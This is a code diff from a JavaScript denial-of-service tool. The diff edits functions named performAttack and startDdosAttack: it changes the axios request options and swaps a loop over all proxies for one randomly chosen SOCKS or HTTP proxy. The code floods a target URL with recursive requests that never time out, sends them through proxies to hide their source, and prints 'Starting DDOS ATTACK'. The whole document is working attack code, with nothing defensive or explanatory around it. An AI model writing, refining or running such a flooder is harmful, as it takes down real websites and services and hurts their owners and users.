@@ -78,7 +78,7 @@ const colors = {
 
 const performAttack = (url, agent, headers) => {
     axios
-        .get(url, { httpAgent: agent, headers, timeout: 0 })
+        .get(url, { httpAgent: agent || null, headers, timeout: 0 })
         .then(() => setTimeout(() => performAttack(url, agent, headers), 0))
         .catch((err) => {
             if (err.response?.status === 503) {
@@ -118,21 +118,19 @@ const startDdosAttack = async (targetUrl) => {
     let continueAttack = true;
     console.log(`${colors.green}Starting DDOS ATTACK...${colors.reset}`);
 
-    for (let i = 0; i < numThreads; i++) {
-        for (const proxy of proxies) {
-            const [host, port] = proxy.split(":");
-            let agent;
+    // Randomly pick a proxy
+    const randomProxy = getRandomElement(proxies);
+    const [host, port] = randomProxy.split(":");
 
-            const proxyProtocol = host.startsWith("socks") ? "socks5" : "http";
-            const proxyUrl = `${proxyProtocol}://${host}:${port}`;
+    const proxyProtocol = host.startsWith("socks") ? "socks5" : "http";
+    const proxyUrl = `${proxyProtocol}://${host}:${port}`;
 
-            agent = proxyProtocol === "socks5"
-                ? new SocksProxyAgent(proxyUrl)
-                : new HttpsProxyAgent(proxyUrl);
+    const agent = proxyProtocol === "socks5"
+        ? new SocksProxyAgent(proxyUrl)
+        : new HttpsProxyAgent(proxyUrl);
 
-            performAttack(targetUrl, agent, headers);
-        }
-    }
+    // Perform the attack with the randomly selected proxy
+    performAttack(targetUrl, agent, headers);
 
     setTimeout(() => {
         continueAttack = false;
